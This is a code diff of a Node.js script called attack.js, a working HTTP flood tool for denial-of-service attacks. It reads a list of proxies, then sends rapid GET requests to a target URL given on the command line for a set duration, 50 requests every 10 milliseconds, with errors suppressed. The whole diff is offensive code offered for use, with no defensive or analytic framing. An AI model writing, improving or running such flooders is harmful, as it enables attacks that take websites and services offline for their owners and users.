@@ -1,68 +1,55 @@
 const fs = require('fs');
 const http = require('http');
-const https = require('https');
 const url = require('url');
-const { argv } = process;
 
-if (argv.length < 4) {
+if (process.argv.length < 4) {
     console.log("Usage: node attack.js <target> <time>");
     process.exit(1);
 }
 
-const target = argv[2];
-const duration = parseInt(argv[3]) * 1000;
+const target = process.argv[2];
+const duration = parseInt(process.argv[3]) * 1000;
+const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
 
-const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(p => p.trim().length);
-let count = 0;
+let sent = 0;
+const endTime = Date.now() + duration;
 
-function randProxy() {
-    const [ip, port] = proxies[Math.floor(Math.random() * proxies.length)].split(':');
-    return { ip, port };
-}
-
-function sendRawRequest() {
-    const { ip, port } = randProxy();
-    const parsed = url.parse(target);
+function flood() {
+    const { hostname, path } = url.parse(target);
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    const [proxyHost, proxyPort] = proxy.split(':');
 
     const options = {
-        host: ip,
-        port: parseInt(port),
-        method: 'CONNECT',
-        path: `${parsed.hostname}:443`
+        host: proxyHost,
+        port: parseInt(proxyPort),
+        method: 'GET',
+        path: target, // full URL because it's via proxy
+        headers: {
+            Host: hostname,
+            'User-Agent': 'Mozilla/5.0 (compatible; Bot/1.0)',
+            Connection: 'close'
+        }
     };
 
     const req = http.request(options);
-    req.on('connect', (res, socket) => {
-        const reqOptions = {
-            host: parsed.hostname,
-            method: 'GET',
-            path: parsed.path || '/',
-            headers: {
-                Host: parsed.hostname,
-                'User-Agent': 'flooder',
-            },
-            createConnection: () => socket
-        };
-
-        const request = https.request(reqOptions, () => {
-            // Don't wait, just dip
-            count++;
-            console.log(`(${count}) Sent to ${target}`);
-        });
-
-        request.on('error', () => {});
-        request.end();
-    });
-
-    req.on('error', () => {});
+    req.on('error', () => {}); // don't log failed
     req.end();
+
+    sent++;
+    console.log(`(${sent}) Sent to ${target}`);
 }
 
-const end = Date.now() + duration;
-const flood = () => {
-    while (Date.now() < end) {
-        sendRawRequest();
-    }
-};
+function startFlood() {
+    const interval = setInterval(() => {
+        if (Date.now() >= endTime) {
+            clearInterval(interval);
+            console.log(`Finished flooding ${target} | Total Sent: ${sent}`);
+        } else {
+            for (let i = 0; i < 50; i++) {
+                flood();
+            }
+        }
+    }, 10);
+}
 
-flood();
+startFlood();
